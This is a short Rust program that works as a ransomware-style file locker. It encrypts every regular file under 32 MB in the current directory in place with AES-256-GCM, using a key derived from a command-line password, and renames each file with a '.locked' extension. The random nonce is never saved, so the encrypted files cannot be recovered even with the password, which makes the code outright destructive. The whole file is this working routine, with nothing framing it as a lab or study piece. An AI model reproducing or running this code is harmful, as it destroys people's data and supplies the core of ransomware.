use aes_gcm::{
    aead::{Aead, AeadCore, KeyInit, OsRng},
    Aes256Gcm, Nonce, Key
};

use sha2::{Digest, Sha256};
use std::{fs, fs::OpenOptions, path::Path};
use std::env;
use std::io::{BufReader, Read, Write, Result, Error, ErrorKind};



const MAX_SIZE: u64 = 32 * 1024 * 1024; // 32 MB
const EXTENSION: &str = "locked";

fn main() {

    let args: Vec<String> = env::args().collect();

    let password = &args[1];

    let executable_path = std::env::current_exe().unwrap();
    let current_dir = std::env::current_dir().unwrap();
    

    println!("Executable path: {}", executable_path.display());
    println!("Current directory: {}", current_dir.display());

    
    let files_list = std::fs::read_dir(&current_dir).unwrap();

    for file in files_list {
        let file = file.unwrap();
        let path = file.path();

         // Check if the file is a regular file
         if !file.file_type().unwrap().is_file() {
            println!("File {} is not a regular file. Skipping...", path.display());
            continue;
        }

        //check if the file is larger than 32 MB
        if file.metadata().unwrap().len() > MAX_SIZE {
            println!("File {} is larger than 32 MB. Skipping...", path.display());
            continue;
        }

        if path == executable_path {
            println!("File {} is the executable. Skipping...", path.display());
            continue;
        }
        // Check if the file is already encrypted (last extension is .locked)
        if path.extension().is_some() && path.extension().unwrap() == EXTENSION {
            println!("File {} is already encrypted. Skipping...", path.display());
            continue;
        }


        println!("File: {}", path.display());
        encrypt_file(&path, password);
        
    }

}

fn encrypt_file(path: &Path, password: &str) {
    
    // Read the file into a buffer
    let mut buffer = read_file_to_buffer(path);

    // Encrypt the buffer
    let key = string_to_key(password);
    let encrypted_buffer = encrypt_buffer(&key, &buffer);

    // Write the encrypted buffer back to the file
    write_buffer_to_file(path, &encrypted_buffer);

    fs::rename(path, format!("{}.{}", path.display(), EXTENSION)).unwrap();
    println!("File encrypted successfully!");
}

fn write_buffer_to_file(path: &Path, buffer: &Vec<u8>) {

    let mut file = OpenOptions::new()
        .write(true)
        .truncate(true)
        .open(path)
        .unwrap();

    file.write_all(&buffer).unwrap();
}

fn read_file_to_buffer(path: &Path) -> Vec<u8> {
    
    // Open file for reading
    let file = OpenOptions::new()
        .read(true)
        .open(path)
        .unwrap();

    // Get file metadata
    let metadata = file.metadata().unwrap();

    let mut reader = BufReader::new(file);
    let mut buffer = Vec::with_capacity(metadata.len() as usize);

    // Read contents into buffer
    reader.read_to_end(&mut buffer).unwrap();

    return buffer;
}

fn encrypt_buffer(key: &Key<Aes256Gcm>, buffer: &Vec<u8>) -> Vec<u8> {
    
    // Create a new AES-256-GCM cipher instance
    let cipher = Aes256Gcm::new(&key);
    
    let nonce = Aes256Gcm::generate_nonce(&mut OsRng); // 96-bits; unique per message

    let ciphertext = cipher.encrypt(&nonce, buffer.as_ref()).unwrap();

    return ciphertext;
}

fn string_to_key(input: &str) -> Key<Aes256Gcm> {

    // Hash the input string using SHA-256
    let hash = Sha256::digest(input.as_bytes());

    // Convert the hash into a 32-byte array
    let key_bytes: [u8; 32] = hash.as_slice().try_into().expect("Hash length mismatch");

    // Create the AES-256 key
    let key = Key::<Aes256Gcm>::from_slice(&key_bytes);

    return key.clone();
}
